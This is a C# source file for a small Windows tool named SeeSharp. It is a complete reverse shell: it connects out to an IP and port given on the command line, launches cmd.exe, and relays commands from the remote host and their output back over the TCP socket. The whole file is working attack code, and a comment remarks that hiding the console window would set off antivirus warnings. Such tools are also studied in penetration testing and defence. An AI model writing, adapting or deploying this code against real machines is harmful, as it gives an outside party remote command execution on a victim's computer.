using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace SeeSharp
{
    class Program
    {
        static StreamWriter streamWriter;
		private static string IP;
		private static int Port;


        static void Main(string[] args)
        {
            if (args.Length < 4)
            {
				Console.WriteLine("An IP and Port are required.");
				Console.WriteLine("Example: seesharp.exe -h 127.0.0.1 -p 4040");
				return;
            }
            if (args[0] == "-h")
            {
				IP = args[1];
				int.TryParse(args[3], out Port);
            }
            else
            {
				IP = args[3];
				int.TryParse(args[1], out Port);
			}

            if (Port <= 0)
            {
				Console.WriteLine("Invalid Port");
				Console.WriteLine("Example: seesharp.exe -h 127.0.0.1 -p 4040");
				return;
			}
			using (TcpClient client = new TcpClient(IP, Port))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						
						//p.StartInfo.CreateNoWindow = true; // Enabling this will throw an antivirus warning, for good reason. 
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while (true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}
	}
}
